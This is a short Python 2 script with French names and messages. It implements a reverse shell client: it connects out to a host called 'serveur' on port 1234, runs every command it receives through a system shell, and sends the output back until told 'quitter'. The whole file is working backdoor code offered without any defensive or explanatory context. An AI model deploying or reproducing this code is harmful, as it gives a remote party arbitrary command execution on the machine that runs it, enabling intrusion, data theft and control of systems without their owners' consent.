import socket
import subprocess

def Connect():

    host = "serveur"
    port = 1234
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    # print "Connecte sur le port {} de la machine {}".format(port, host)

    while True:

        commande =  sock.recv(1024)

        if 'quitter' in commande:
            print 'Fermeture de la connexion'
            sock.close()
            break

        else:

            shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            sock.send(shell.stdout.read() + shell.stderr.read())

def Main ():

    Connect()

Main()
